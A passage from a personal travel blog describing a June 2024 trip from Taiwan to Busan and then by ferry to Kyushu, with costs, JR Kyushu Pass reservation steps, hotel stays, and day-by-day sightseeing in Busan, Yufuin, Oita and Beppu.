visiting Takachiho Shrine, Takachiho Gorge, Amano Iwato Shrine, and Amano Iwato Shrine. June 12: Sasebo, Ninety-Nine Islands, Huis Ten Bosch or baseball.Actual: Went shopping in Hakata, shopping in Tenjin, and watched baseball at PayPay Dome. June 13: Shopping in Fukuoka city, then take the 21:00 flight back to Taiwan.Actual: Spent more time at Lalaport.For internet access, I bought a DJB plan again, which included 2GB for 2 days in Korea and unlimited data for 9 days in Japan, totaling NT$1,250.Traveling to Takachiho was extremely difficult from Fukuoka, so I directly signed up for the KKDAY Takachiho Day Tour, which included transportation, lunch, and a Chinese-speaking guide, costing NT$2,272 per person.Flights Outbound: China Airlines, Taipei Taoyuan TPE 15:55 → Busan Gimhae International Airport PUS 18:55 Return: China Airlines, Fukuoka Airport FUK 21:00 → Taipei Taoyuan TPE 22:25 Round trip includes checked baggage (23 kg per piece).Price: NT$10,480🛳️ Cruise New Camellia Departure: Check-in at Busan Port International Shipping Terminal at 18:30 Arrival: 07:30 at Hakata Port International Shipping TerminalPrice: Economy/2nd Class: Shared Cabin NT$1,450 per person🚅 JR Pass North Kyushu Rail Pass (5 Days)Price: NT$3,042 During this trip in Kyushu, I used the JR Pass to take limited express trains whenever possible. Except for Yufuin, which required special reservations, I mostly sat in non-reserved seat cars (there weren’t many people, and there were always seats available).I couldn’t reserve a seat on the Yufuin no Mori train from Hakata to Yufuin, so I could only book a seat on the regular Yufu 1 train.Please note that the Yufuin no Mori and the regular train (Yufu X) are different, so be careful when making reservations to ensure you are booking the Yufuin no Mori.Reservation Process: You must purchase the JR Pass before making a reservation, as the travel agency options for reservations are limited to KLOOK. I was concerned that other agencies might not be able to make reservations, so I bought my JR Pass from KLOOK.1. Go to the JR Pass reservation homepage:Scroll down to find “Rail Pass Purchase” → “Inquiry/Change/Refund.”2. Go to the JR Pass reservation page :Select “Register.”Read and agree to the terms, then click “Next.”Enter the email you want to register and click “Register.”Check your email for a message, note the “temporary password,” and click the continue link. Select the travel agency name: KLOOK If you have an MCO issued by a different travel agency, please do not make any selections. KRP reservation number/MCO numberGo to KLOOK to view your JR Pass voucher and copy the voucher number. NameEnter the name on your JR Pass order. If the voucher is issued by KLOOK, enter the first name + last name. For example, if my voucher says LI ZXXX CXXX, I would enter ZXXX CXXX LI here. Please enter the name as registered when purchasing the JR Kyushu Rail Pass Online Booking or as marked on the voucher issued by the travel agency (eMCO, MCO). If you are using a voucher issued by KLOOK, please enter your name in the order of “first name” and “last name.” Enter the temporary password from the email.5.6. Enter the password you want to set for login.Once you complete the password setup, you can check and reserve train seats during the available reservation times ( Japan time 05:30~23:00). Reservations cannot be made outside of these hours. Departure date Departure station: Hakata Arrival station: YufuinThe Yufuin no Mori was fully booked, so I could only reserve a seat on the regular train Yufu 1, with the earliest departure at 07:43 and arrival at 10:03. Continue to the next page to select seat preferences, location, and car.Enter the start date for using the rail pass.Please enter your credit card information to pay for the reservation fee (1,000 yen per adult / 500 yen per child). The above is the buyer’s credit card. You must bring and present the credit card used for payment when picking up tickets at the counter. The above is the buyer’s credit card. You must bring and present the credit card used for payment when picking up tickets at the counter. The above is the buyer’s credit card. You must bring and present the credit card used for payment when picking up tickets at the counter. ⚠️ So please make sure to bring that credit card when picking up your tickets ⚠️Checkout complete, reservation confirmed!Stay (10 nights, including 1 night on a cruise) [6/3] Toyoko Inn Busan Station No. 1 (1 night)Great location right outside Busan Station, just a short walk to the Busan Port International Shipping Terminal, making it convenient to get around.Price: NT$1,940 for a twin room for two people. [6/4] New Camellia Ferry (1 night)Price: NT$1,450 per person. [6/5] Toyoko Inn Hakata-guchi Station Front (1 night)About a 10-minute walk from Hakata Station.Price: NT$2,911 for a twin room for two people. [6/6, 6/7] Toyoko Inn Oita Station Front (2 nights)About a 10-minute walk from Oita Station.Price: NT$4,389 for a twin room for two people. [6/8, 6/9] APA Hotel Fukuoka-Watanabedori EXCELLENT (福岡渡辺通駅前) (2 nights)About a 5-minute walk from Watanabe-dori Station.Price: NT$9,311 for a twin room for two people. [6/10, 6/11, 6/12] Toyoko Inn Fukuoka Tenjin (3 nights)About a 10-minute walk from Tenjin Minami Station.Price: NT$7,131 for a twin room for two people. Total: NT$14,291, averaging NT$1,400 per night. Finally managed to keep it under NT$1,500 per night this time, thanks to Toyoko Inn! Additionally, becoming a member of Toyoko Inn allows you to earn 3 points for every check-in, stay 10 nights and get 1 night free, book up to 6 months in advance, receive a 5% discount, and enjoy benefits like direct credit card check-in… and more. Last time I stayed at Toyoko Inn in Hiroshima, I signed up for a membership. Just let the front desk know you want to sign up during check-in, fill out a simple form, and pay the one-time membership fee of 1,500 yen. They take your photo on-site and issue your card right away, so you can start using it immediately.In Korea, use Naver Map to plan your itinerary and routes in advance for easy navigation: I find it more user-friendly than Google Maps for travel! You can log in directly using Line.Go! Flight Tracker, iPhone Suica usage, Visit Japan pre-entry application… I’ve mentioned these in previous articles, so I won’t go into detail here.Visit Japan has now combined the entry and customs processes into one QR code.Day 1 DepartureAs with previous trips abroad, I first went to the A1 counter at Taipei Main Station to check in early, so I could go directly to the airport for departure. ( For flights eligible for early check-in, please refer to the official website.) I initially planned to take the orange line to Sanchong for the transfer, but the other early check-in station for the airport MRT is at A3 New Taipei Industrial Park Station, not Sanchong Station, and there are no direct trains from Sanchong Station, so I decided to go to Taipei Main Station instead. As before, I put an Airtag in my suitcase for easy tracking.Taoyuan Airport TPE Terminal 1This time, China Airlines is flying to Busan from Terminal 1.At the airport, I first looked for a counter to exchange for Korean won. Most foreign exchange ATMs do not provide Korean won, only Japanese yen; the airport exchange rate is poor and charges a NT$100 handling fee, so if you have time, it’s better to exchange at a bank in advance.13:00 DepartureI completed the departure procedures around 13:00.After exiting Terminal 1, I grabbed some Tasty Fried Chicken for lunch.Previously, the observation lounge was closed, but this time it was open, so I went up to check it out. It turned out to be quite small.Since it was still early, I decided to relax in the free VIP lounge at Terminal 1, which was not crowded at that time.The Tasty Fried Chicken was marinated and very tasty, but unfortunately, this airport location does not serve the signature Gua Gua Bun; also, I noticed that all the charging stations have been removed, leaving only the shells, so they can’t be used.The lounge has a combined bathroom and toilet, with a limited number of facilities (about five), but they are very clean and well-maintained by the cleaning staff.15:20 Boarding BeginsBoarding started around 15:20.At Terminal 1, you need to take a shuttle bus to the boarding gate. There weren’t many people on this flight to Busan! As shown in the picture, there were probably fewer than 30 passengers.This China Airlines flight to Busan is on a Boeing 737-800, which is a medium-sized aircraft without entertainment screens. Bye Taiwan!I had to rely on in-flight Wi-Fi to access entertainment content, and there were quite a few movies available! There was even “The Fast and the Furious”! The in-flight meal was three-cup chicken noodles (which were not very good), and I was surprised to find a collaboration snack featuring the short-tailed quokka from China Airlines x Wutong x Dinotaeng Quokka.I filled out the immigration card, customs card, and the quarantine QR code can be applied for in advance; if you don’t apply in advance, you’ll need to fill out an additional quarantine card.19:05 Arrival at Gimhae International Airport PUS in Busan, KoreaThe daytime temperature in Korea is about 20–25 degrees Celsius, and it may drop below 20 degrees at night; it feels a bit like autumn in Taiwan.19:20 Exiting the Airport KKday Busan PassI exited the airport around 19:20 after going through immigration and collecting my luggage.At that time, I misunderstood the relationship between wowpass and tmoney, thinking they were just two combined cards; my understanding was that wowpass is a cash card for cash exchange and shopping, while tmoney is a transportation card, and wowpass would include tmoney; in reality, you only need to buy tmoney, not wowpass. I didn’t realize this at the time and kept looking for wowpass instead of tmoney. There are no wowpass machines at Gimhae International Airport, so I had to buy a ticket with cash to get to Busan.From Gimhae Airport to Busan Station, the subway requires three transfers; there weren’t many people on the trains, so I wasn’t worried about crowding. If you have a transportation card, you can swipe it directly to enter. The first segment is on the purple line from Gimhae Airport Station to Sasang Station. Follow the floor signs to the platform. After getting off at Sasang Station on the purple line, follow the signs to transfer to the green line. Take Line 2 on the green line to Seomyeon Station. Buy a ticket for the second segment to Seomyeon Station. After getting off at Seomyeon Station on the green line, head towards the orange line platform. Take Line 1 on the orange line to Busan Station. Transferring from the green line to the orange line does not require exiting the platform. I wasn’t sure if I could buy a ticket to Busan Station while on the green line, so I didn’t pay close attention; therefore, when I got to Busan Station, I couldn’t exit and had to get a manual ticket to leave.20:20 Arrival at Busan StationUpon exiting, I found Toyoko Inn Busan Station No. 1.I dropped off my luggage and went out to find something to eat. Fortunately, the hotel has 100V Taiwan outlets/USB ports, so I didn’t need a power adapter.Since it was late, most of the nearby barbecue places were closed; I randomly found a pork soup rice restaurant to solve my hunger ( The Doi Jongga Dwaejigukbap Busan Stn. ). The pork soup rice had a strong pork flavor, the broth was oily but not too rich, and it was okay to eat with rice. The grilled pork neck was good with lettuce and kimchi, but eating too much can be quite greasy. Two bowls of soup rice and one plate of grilled pork neck cost a total of 46,000 won.Wowpass / TmoneyThere was a wowpass machine in the hotel lobby. I scanned my passport and followed the instructions to complete the process, and the machine dispensed the wowpass + tmoney combined card. The upper part is Wowpass. The chip is Wowpass. Wowpass and Tmoney are separate. You can recharge Wowpass through the Wowpass machine, directly with New Taiwan Dollars, online with a credit card, for currency exchange, or cash withdrawal (with a handling fee). Wowpass has an expiration date, and if not used for too long, the balance may disappear. The chip part can be used for card payments at merchants. Tmoney can be recharged at convenience stores or subway recharge machines. Currently, you cannot deposit money from Wowpass into Tmoney (the official statement says this will be possible in the future). Wowpass requires an initial deposit of 5,000 won, but it seems this step can be skipped, which means you can get the card for free? The lower part is Tmoney, so remember to use the lower part when taking the subway or bus; I initially tried to use the whole card and kept failing, as it seemed to read the Wowpass instead. After receiving the physical card, you can bind it in the Wowpass App. The Wowpass App allows you to check your Wowpass balance. The Tmoney balance can only be checked by swiping the card (how unique!). As shown in the image, Wowpass balance is 454 KRW / Tmoney balance is 2,500 KRW.If you want to know the details of Tmoney recharges and deductions, you need to install the App (BucaCheck): It also reads the content by swiping the card. If you find this travelogue helpful, you can enter my invitation code when registering for Wowpass: 373TBH87After finishing dinner, we went to GS25 to buy some Korean beer and snacks. Kelly enjoyed the beer, and the snack on the right looked like spicy strips but wasn’t as salty or spicy—perfect for pairing with drinks. The crab-flavored crackers were just okay.Resting, wrapping up a busy Day 1.Day 2: Haedong Yonggungsa Temple, Haeundae, and boarding the New Shimonoseki FerryHaedong Yonggungsa TempleWe took bus 1001 from Busan Station to Haedong Yonggungsa Temple early in the morning; there are frequent buses and not many people.The journey takes about an hour and a half. The buses in Korea are similar to those in Taiwan, and the drivers tend to drive quite fast. Normally, passengers enter from the front and exit from the back, but some people also enter from the back and exit from the front.The drop-off point is right across from Skyline Luge Busan.After getting off, we walked forward and soon saw the signs for Haedong Yonggungsa Temple. A right turn and a short uphill walk will get you there; the map says it takes 15 minutes, but since it’s uphill, it actually takes about 30 minutes. If you don’t want to walk, you can also take a taxi.You will first pass through a shopping street, and there are also places like a container market nearby where you can take a break and grab a bite. Upon entering, you can see a row of 12 zodiac animal representations, with the dog representing the Year of the Dog.Continuing forward, you will see the entrance gate to Haedong Yonggungsa Temple, which is very colorful and distinctive.Be careful as you walk down the stairs to the main temple area.You can first head to the viewing platform on the left to get a panoramic view of the entire temple.Entering the main hall, you can buy a tile to write your wishes on (10,000 KRW).HaeundaeFrom the bus stop outside Haedong Yonggungsa Temple, we took bus 1001 back to Haeundae (about 1 hour).The sun was shining brightly that day, and there was a sand sculpture exhibition on the beach. Be careful going down the stairs; I witnessed a Korean uncle miss a step and fall into a sand pile (thankfully, it was just sand).ㄏHaeundae LCT, a landmark building in Busan.HAEUNDAE, under a clear blue sky.Haeundae Beach has lifeguards, marked swimming areas, and water activities available.For lunch, we had Korean BBQ at Baegnyeon Sikdang near Haeundae, where the staff cooked for us. We ordered a portion of Korean beef ribeye and pork neck, both delicious, along with a stone pot rice that had a strong burnt rice aroma. We shared the meal between the two of us.We also ordered some Korean beer and soju to enjoy (I forgot to try the soju beer mix). The price was 13.0, which means 13 * 1000 = 13,000 KRW. There were also a bunch of Korean side dishes, including pickled vegetables, kimchi, and raw marinated crab (which I was too scared to try because it smelled too fishy). The staff were friendly and spoke decent English.Next to the restaurant is the Haeundae Traditional Market, mainly selling local seafood. We bought an ice cream and walked around, then went to another shop selling ice cream croissants and had a tea-flavored ice cream croissant (crispy on the outside, soft on the inside, delicious!).After eating, I forgot that Haeundae also has a monorail and that the Haeundae LCT can actually be visited (I didn’t do thorough research on Busan before the trip). By around 14:00, we took bus 1001 back to Busan Station, thinking we would figure out where to go next or just explore Busan Station.We returned to Busan Station around 15:00, and with plenty of time before the cruise check-in at 18:30, we realized there wasn’t much to do around Busan Station (it seems there are no department stores or shopping streets or attractions). I was worried that going to Gamcheon Culture Village would be too far, but I found out that a few stops down from Busan Station, you can go to Busan Tower, which is surrounded by department stores and shopping streets. Originally, I planned to go to Busan Tower, but I accidentally got off at the wrong subway station and ended up walking a long way, so I gave up and returned. _[KKday Busan Yongdusan Park Busan Tower Observation Deck e-ticket](https://www.kkday.com/zh-tw/product/19378?cid=19365&amp;ud1=cb65fd5ab770){:target=”blank”}. To go to Busan Tower, you need to get off at Nampo Station and take the escalator from Exit 1 or 3 to Gwangbok-ro Fashion Street to reach Yongdusan Park. Don’t take a long detour up the mountain.I bought some famous Korean banana milk to drink.17:00 Departing for Busan Port International Shipping TerminalAround 5 PM, I wandered around near Busan Station before heading to the hotel to pick up my luggage and make my way to the Busan Port International Shipping Terminal.Entering the Busan Station lobby (2nd floor), I found Exit 10, and walked along the sky bridge to reach the Busan Port International Shipping Terminal (about a 15-minute walk). Do not walk on the ground level; there are many large vehicles, which is very dangerous.The Busan Port Bridge during the day.The Busan Port International Shipping Terminal (dock) was quite empty, with not many people, as there are only a few sailings each day; besides the route to Fukuoka, there are ferries to Shimonoseki, Tsushima, Osaka, Kumamoto, and more.We went up to the 3rd floor for departure, first heading to New Camellia to exchange our ferry tickets (passport required).Around 17:30, we started waiting to board; the waiting area was quite spacious. You can actually walk around and buy food to take on the ship.Things to note: You cannot use the electronic gate at Hakata Port, so please make sure to fill out the immigration card and customs declaration card ⚠️ You can bring food and water, and you don’t need to check your luggage, as you can take it on board with you. Only handheld drinks are not allowed. The entire departure process is very quick; security checks are quite casual (everything goes through X-ray).Departure opens at 18:30.After clearing customs, the waiting area is not very large, with a few duty-free shops and cafes (only one sells food), so I bought a tuna sandwich to fill my stomach.I also bought some famous Korean Toms Gilim almond snacks (classic honey flavor, strawberry chocolate-covered, tiramisu flavor) as souvenirs.After clearing customs, you can line up with your luggage; everyone else is also lined up with their suitcases, ready to board.Koreans make up about 90% of the passengers.You can look out the window at Busan Port, and as the time approaches, everyone returns to their luggage to prepare for boarding.It takes about 15–20 minutes to walk and wait from the dock to the ship.New Shimonoseki FerryRoom 430; after boarding, we went up to room 430 on the 4th floor.The space is quite small, accommodating a maximum of 11 people. This time, we had a family of three, two couples (four people), and my friend and I (two people), so it wasn’t fully booked. It seems they arrange people from the same language or country together (besides one couple from Hong Kong, the rest were all Taiwanese). Each person’s space is small, with hard pillows, simple mattresses, new sheets, and blankets. It was first come, first served, and we happened to get a corner spot, which was slightly larger. There are two outlets (no adapter needed) for charging.After settling in our luggage around 20:00, the ship is scheduled to depart around 10:30.The 3rd floor has a restaurant and a small shop with vending machines (all use Japanese yen), selling slippers, toiletries, and sanitary products. The restaurant does not serve food; you can only buy instant noodles or microwaveable food from the shop. Therefore, it’s recommended to bring food from Busan. Note: Meat products cannot be brought into Japan; any leftovers must be discarded. ⚠️Fortunately, I had a sandwich before boarding, so I wasn’t very hungry and just bought some instant noodles to solve my meal. Note: Hot water is not available at the restaurant; there is only a cold water dispenser there. For hot water, you need to go to the galley near the back of the ship; I searched for a long time before finding it. Also, be careful when operating the hot water dispenser; first, turn on the switch, and it won’t dispense water immediately; you have to wait a bit. Once it starts, be careful when using it, and make sure to turn it off tightly after use to avoid scalding the next person.After eating, I went out on deck for a stroll (you can come and go freely, but be careful of slippery surfaces).Around 21:00, another ferry to Shimonoseki (PUKWAN FERRY) departed first.Looking back at the night view of Busan Port.Around 22:30, the ship began to leave Busan Port, passing under the Busan Port Bridge, and the night view of the bridge was stunning (it gets cold, so dress warmly).Economy CabinThe economy cabin lights go out at 11 PM, so after watching the departure, you can head back and lie down. Only the first-class rooms have private bathrooms; the others are shared. The bathroom is a Japanese public bath, so you need to be completely naked. There are small partitions for washing; if you’re too shy to go, you might end up not showering at all. Overall, the facilities are quite old but kept clean. There’s an entertainment room and KTV. The public areas remain lit. The internet is available until around 11 PM after departure (it’s said that there might be a short stretch without internet). As you approach Tsushima Island, you’ll enter Japanese territory and need to switch to a Japanese SIM card. The ship will sway slightly while in motion, so if you’re prone to seasickness, you might want to take some medication.Good night, Busan.Day 3: Hakata, Yutoku Inari ShrineWe arrived in Busan around 5:30 AM, and the lights in the economy cabin turned on. Stepping out onto the deck, we enjoyed the serene view of Hakata Port and the Hakata Port Tower in the early morning.If you ordered breakfast, you can head to the restaurant. We didn’t, so we took our time washing up, wandering the deck, and packing our things to prepare for disembarkation. Disembarkation officially starts at 7:30 AM, and everyone will queue at the 3rd-floor lobby exit with their luggage.By around 8:00 AM, we completed immigration in Japan and exited the Hakata Port International Shipping Terminal. A reminder: You cannot use electronic gates at Hakata Port, so please make sure to fill out the immigration and customs cards. ⚠️Once outside, there are buses heading to Hakata Station or the Tenjin area. Although it’s inconvenient to take a bus with large luggage, since this is the departure station, there will definitely be seats available. Most people also have luggage, so it’s less awkward. There will be a few people getting on at the intermediate stops, but it’s not too crowded. On weekdays in the morning, the subway back to Hakata isn’t too busy, so there’s no need to feel awkward (Kyushu is spacious!).Around 9:30 AM, we dropped off our luggage at the hotel and headed to the food street in the Hakata Station department store for a morning meal of clam soup set to fill our stomachs, and to pick up our JR Pass and train tickets for tomorrow morning to Yufuin. The JR Kyushu Pass can currently only be exchanged at a manned counter, so please go early to queue for the exchange. If there are too many people at Hakata Station, you might consider exchanging at a nearby station for a quicker process!Yutoku Inari ShrineOriginally, we planned to visit Karatsu Castle, but after checking the JR limited express schedule, we decided that Yutoku Inari Shrine was closer and quicker, especially after yesterday’s fatigue.We took the train from Hakata to Hizen-Kashima Station in Kashima City.After exiting the station, walk left along the road to wait for the bus on the opposite side at stop 2. This is different from Google Maps, which directed me to walk to Nakamuta Station to wait for the bus, about 500 meters away. Please note that I visited in June 2024, and the platform may change over time.Yutoku Inari ShrineAfter getting off the bus in front of Yutoku Shrine, just walk back to reach the Omotesando.I’m not sure if it was because it was a weekday, but the Omotesando and shopping streets were almost deserted, with very few shops open.Walking all the way to the end (about 15 minutes) leads you to the shrine.At the entrance of the shrine, the glass building behind is an elevator; if you don’t want to walk up, you can pay to take the elevator.As you walk up, there’s a row of prayer wind chimes. When I went, there was no one around, and as I passed by the wind chimes, a gust of wind rang through them.Walking through a row of torii gates and beautiful blooming hydrangeas, you can hike up to the Okunoin (about 200M, steep and difficult to walk).After visiting, we returned to the station and headed back to JR.Comparing the Uo Shrine’s torii gate in the sea with Karatsu Castle, I felt the sea torii gate was quite ordinary (after all, I’ve seen the grand torii gate at Itsukushima Shrine) and the transportation was quite troublesome, so I planned to head directly to Karatsu.I made a mistake while changing trains; this was a small station with no electronic boards. When I got off, I saw the platform sign saying “Karatsu direction” and thought I could change trains there. However, when the time came, the train passed through from another platform, and I missed it.After studying the schedule carefully, I realized that I needed to check the box in the lower right corner of the timetable for the correct waiting platform, as the platforms may not be the same on weekdays and holidays.Since I missed the train to Karatsu and couldn’t return to the Uo Shrine’s torii gate, and after yesterday’s chaos, I decided to head straight back to the hotel in Hakata to rest. On the way back, I discovered something interesting. I was wondering why the train at the small station didn’t open its doors (I was sitting in the back car); upon closer observation, I found that at a station without staff, the train conductor is also the station staff. To get off, you have to exit from the first car and pay the fare according to the screen or swipe your transport card (just like on a bus). If you use the JR Pass, you only need to show it to the driver. Additionally, I want to remind you again that if you exit a JR station without staff, you can just walk out with your JR Pass. Do not drop your JR Pass into the ticket collection box. ⚠️Around 4:00 PM, we returned to Hakata and the hotel. Please note that the washing machines at Toyoko Inn may not have detergent, so check first to see if it’s an automatic detergent-dispensing machine ⚠️ If not, you’ll need to insert coins or buy detergent from the front desk (30 yen).After putting my clothes in the washing machine, I went to the underground food street at Hakata Station to find something to eat.I bought a steak bento to eat back at the hotel, which was great; the tea was okay, not much flavor.I also bought a Yakult 1000 to drink at night, BRULEE caramel ice cream for dessert (so sweet!), and some fried shrimp for a late-night snack (this time I actually got whole fried shrimp, unlike the fake ones I bought in Kumamoto).Laundry (30 mins), drying (1 hr), rest.Day 4: Yufuin, Oita [_Reference itinerary: KKday Japan Kyushu Fukuoka Oita Day Trip Dazaifu Tenmangu, Yufuin, Beppu Sea Hell &amp; Kamado Hell Departing from Hakata (Chinese, English, Japanese)_](https://www.kkday.com/zh-tw/product/125898?cid=19365&amp;ud1=cb65fd5ab770){:target=”_blank”} Early in the morning, we checked out and dragged our luggage to JR Hakata Station to take the Yufu 1 train to Yufuin. You can store your suitcase in the luggage compartment; if you’re worried about it sliding, you can lay it sideways. A cup of coffee to wake up. The scenery along the way in this season is lush green, but nothing particularly eye-catching (or is it only the Yufuin no Mori that has views?).Upon arriving at Yufuin Station, I immediately turned right to the coin lockers to store my luggage, as there are fewer spots available for suitcases (1,000 yen).Perhaps due to the season and weather, I found the overall tone to be gray and green, lacking any special feeling.Walking along the street leads you to Kinrin Lake, where the green lakeside exudes a sense of tranquility.Kinrin Lake is very clean and clear, with many maple leaves (not yet changed color).Along the street from Yufuin Station to Kinrin Lake, there are many IP and creative shops to explore. If you’re interested in food, you can also check out the Yufuin Gold Award desserts, which include pudding, ice cream, and more.Of course, you can’t miss the Totoro Forest, Ghibli characters, and the “Kyushu specialty” Kumamon that can be seen everywhere.The Yufuin Showa-kan has a very traditional Japanese feel.The Flower Village looked too touristy and crowded, so I didn’t go in to take a look.On the way, I bought the famous pudding dorayaki and some souvenirs (sesame powder, Yufuin brick factory - Seven Lucky Gods, creative items, incense Yufuin fragrance, etc.). A little side note: I unexpectedly ran into a colleague in this paradise of Yufuin XD — Pinkoi community sisterFor lunch, we originally planned to eat the famous Yufuin Kamameshi at Yufuin Mabushi Shin, with one location at Kinrin Lake and another at the station exit. However, the station exit location was closed that day, and we didn’t feel like walking back to the main store, so we decided to eat at Sushi Gen on the first floor instead.I had the Bungo beef steak, and my friend had a rice bowl; the beef was delicious, very flavorful and juicy, with no fishy taste, and the price was reasonable.After eating, we strolled around a bit, and by around 3:00 PM, we took the train to continue on to Oita.There are quite a few trains from Yufuin to Oita, and there were not many people (maybe more people were returning to Hakata?). There are also local trains, so we took a local train this time and practiced the new Japanese I learned:この電車は大分に行きますか。はい、大分に行きます。4:20 PM OitaWe happened to encounter some installation art at Oita Station (it even makes sounds).Oita gives off a vibe of being far from the hustle and bustle; while wandering around the city center, it felt unusually quiet, with only the faint sound of car engines and not many people or vehicle noises.First, I dropped off my luggage at the hotel. The layout of Toyoko Inn is quite similar across locations, and I happened to get a room that was exactly like the one I had at Hakata Station yesterday. The only difference is that the bathroom here is larger, while the hallway is narrower.Since it was still early, I thought I’d take a stroll around the area and casually opened Google Maps to check out nearby attractions.Giant BougainvilleaOn the way to Oita Castle, I spotted a giant bougainvillea in the park’s parking lot (it looked a bit like a curse from Jujutsu Kaisen).Oita CastleAll that remains of Oita Castle are the moat, castle walls, and courtyard, which now features an open parking lot and a platform for the castle tower, offering a view of Oita City.There’s an official AR App available that lets you see what Oita Castle looked like in the past.After wandering around, I headed back to the station market to grab some food. The buses in Oita have a vintage feel but are well-maintained.For dinner, I wasn’t sure what to eat, so I casually picked up a pork cutlet rice bowl and a Suntory non-alcoholic sparkling drink (it was delicious!). The sauce packets in Japan are thoughtfully designed with a small corner for easy opening.For a late-night snack, I had a strawberry smoothie ice cream, some grilled food, and a limited-edition Kirin pineapple beer (it had a strong pineapple flavor and was a bit sweet).Day 5: Beppu Hell, Beppu Reference itinerary: KKday 【Beppu and Yufuin Day Tour】 Nyoirinji Temple + Beppu Hell + Yufuin (Departing from Fukuoka) _[Kyushu Beppu Hell Hot Spring Tour General Admission / Pre-sale Tickets Buy Now, Use Now](https://www.kkday.com/zh-tw/product/122902-beppu-hell-tour-common-admission-ticket-advance-ticket-japan?cid=19365&amp;ud1=cb65fd5ab770){:target=”blank”} The JR Limited Express from Oita Station to Beppu Station takes only about 15 minutes, and the scenery along the way is somewhat reminiscent of the journey from Hiroshima to Kure.After arriving at JR, I transferred to a bus heading to Beppu Hell — the first stop is the Sea Hell, following the order shown in the itinerary above. I wanted to visit all seven hells, so I bought a full set of seven tickets at the entrance of Sea Hell, which was cheaper. If you’re short on time, I think you could just visit Sea Hell. To enter, you only need to tear off a corner of the ticket and drop it into the box. Each hell has a free foot bath area for relaxation.Sea HellI found Sea Hell to be the most spectacular, with constantly bubbling steam and deep blue hot spring water.There’s a small plateau and a shrine at the back.The small blood pond on the other side is also quite unique.After leaving Sea Hell, just follow the signs to the next stop, Oniishi Bozu Hell.Oniishi Bozu HellThis one mainly features mud geysers.After exiting, there are also signs leading to the next hell.Kamado HellThe milk pool at Kamado Hell looks like a great place to soak.However, the highlight of Kamado Hell isn’t the hot spring itself, but the smoke. Staff members use incense sticks and blow air to create a large amount of smoke from the hot spring steam, which is quite fascinating (it’s said that the particles from the incense sticks attract more water vapor molecules, causing them to cluster).Another feature of Kamado Hell is the long row of hot spring experiences, including rock foot baths, drinking hot spring water (which tastes a bit thick and salty), foot soaks, face steaming, hand steaming, and throat steaming (just like visiting a pediatrician in Taiwan XD).This area is larger, with more activities to experience, and there are shops selling snacks, making it a nice place to relax.Once again, you can see the sign for Oniyama Hell as you exit.Oniyama HellThe water at Oniyama Hell boils even more vigorously, constantly bubbling over.On the other side of the park is a crocodile garden.Following the signs down leads to Shiraike Hell.You’ll pass the Hell Hot Spring Museum (with a café) where you can take a break.Shiraike HellShiraike Hell is less distinctive, featuring a small tropical fish aquarium.The remaining Blood Pond Hell and Tornado Hell are not in this area and require a bus transfer to reach.After exiting Shiraike Hell, I walked down to the intersection, turned left, and waited for the bus at the Takarada 2 stop.Blood Pond HellFirst, I visited Blood Pond Hell, which has a small blood pond similar to Sea Hell, but on a larger scale.Continuing down leads to Tornado Hell.Tornado HellTornado Hell is an intermittent geyser that erupts approximately every 30-40 minutes, lasting about 6-10 minutes each time. You can ask the staff at Tornado Hell (they were proactive in informing us) if it’s about to erupt; if it is, you can watch, but if you have to wait, you can visit Blood Pond Hell first.The steam during the eruption forms a tornado, hence the name.GokurakuteiI had lunch at Gokurakutei in Blood Pond Hell.I tried the famous Hell Gokuraku Curry, which features Japanese rice that’s perfectly cooked and paired with thick curry (slightly spicy), along with grilled vegetables and chicken. It was delicious and refreshing without being heavy.After eating, I found out there are nearby attractions like Kifune Castle, Jizoyama Observatory, Myoban Hell, and Yufuin…Kifune CastleOn my way back to the Takarada 2 bus stop, I decided to check out Kifune Castle. The castle is small, but the view from the lookout is nice. However, the walk from the bus stop and the uphill trek can be tiring. The Jizoyama Observatory, Myoban Hell, and Yufuin are actually located above Sea Hell; if I were to replan my itinerary, I would visit these attractions first, then go down to Sea Hell, and finally to Blood Pond Hell and Tornado Hell, or vice versa, starting with Blood Pond and Tornado.Jizoyama ObservatoryI took the bus back to Takarada 2 and headed to Jizoyama Observatory, which offers a view of Beppu City. The sun was blazing hot, and the observatory only had restrooms, with no shops or resting areas.The green mountains across from the entrance were beautiful.Since it’s known for its night view, there wasn’t much to see in the morning; it was just hot.Myoban HellI headed back down to Myoban Hell, where the ticket booth is located at the Okamotoya Pudding Shop across the street. Just gesture to the staff that you want to go to the other side.You can try a hell-steamed pudding before you leave.The Yufuin Flower House is where they dry the hot spring to obtain crystals. If you walk up to the Yufuin Flower shop, they sell this hot spring bath additive.Yufuin Flower HouseI bought some bath additives, face masks, and creams as souvenirs from the Yufuin Flower shop.Additionally, they offer private baths for those who might feel shy about using public hot springs.At this point, it was around 4:00 PM, and I was getting ready to take the bus back to the city.BeppuAfter returning to Beppu Station, I walked to Beppu Tower, casually exploring along the way (the statue in front of the station, the old hot spring hall, and the great Tengu).Beppu TowerAt Beppu Tower, I bought a ticket from the vending machine on the first floor and took the elevator up to get a bird’s-eye view of the coastal area of Beppu.Looking down at the streets and cars from above was quite soothing.Inside the tower, there’s a meteorite exhibit. In addition to Beppu Tower, you can also visit the cable car or the new Beppu World Tower.Additionally, the Beppu Tourism Bureau website offers other itinerary references :Beppu Tourism Bureau WebsiteHead back to the hotel to rest.After resting at the hotel, I went to the Oita Station market to buy dinner: a pork cutlet bento and a locally exclusive fruit wine (refreshing and not too sweet).For dessert/snacks, I had fried shrimp, instant noodles, white peach ice cream, and jasmine tea (which I’m not a fan of).Day 6: Shimonoseki, Karatsu KKday Itinerary Reference: One-Day Private Car Tour in Fukuoka and Kitakyushu, including Dazaifu Tenmangu Shrine, Mojiko, Karato Market, Kanmon Straits, and Akama ShrineI started from Oita to Kokura, then headed to Mojiko and Shimonoseki. Shimonoseki and Karatsu are about 140 kilometers apart, which is not a typical itinerary for most people. I really wanted to visit Karatsu since I missed it on my first day in Japan due to taking the wrong train, so I decided to push through with a one-day trip.I woke up late, around 8:40 AM, and took the JR Limited Express to Kokura, where I planned to drop off my luggage before taking a local line to Mojiko.It started to drizzle in Oita, and I realized that every city I’ve visited has had rain. (The rain god is definitely at work.)I arrived at Kokura Station around 10 AM and searched for a long time, but all the self-service luggage lockers were full (a friend told me he found space at 9 AM). The manned luggage counter wouldn’t open until 11 AM, so I had to drag my luggage directly to Mojiko and look for options there.After exiting Mojiko Station, I went left (without leaving the building) to find the self-service coin lockers. There were quite a few people at Mojiko this time, and all the lockers were full; luckily, the manned luggage counter had opened, and I was able to store my bags successfully (but note that this counter only operates until 8 PM! ⚠️).I initially wanted to eat Mojiko curry since there were no lines last year, but upon exiting the station, I saw a long queue and decided to give up. I turned right to wait for the bus to 